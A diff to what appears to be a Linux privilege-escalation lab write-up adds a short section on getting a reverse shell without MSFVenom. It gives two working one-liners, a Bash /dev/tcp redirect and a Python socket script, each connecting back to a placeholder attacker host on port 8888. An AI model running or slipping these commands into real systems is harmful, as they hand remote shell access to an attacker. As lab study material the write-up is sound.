@@ -188,3 +188,10 @@ After 5 minutes, we should get a shell
 In order to get a cleaner looking shell (known as TTY shell), try spawning one via the [NetSec list](https://netsec.ws/?p=337)
 
 ![](/Common%20Linux%20Privesc/images/spawn_ttyshell.png)
+
+## Alterantive Way without MSFVenom
+
+Can create a shell without generating a payload using MSFVenom either through Bash, Python or other means
+
+* Bash - `bash -i >& /dev/tcp/<IP>/8888 0>&1`
+* Python - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker ip>",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
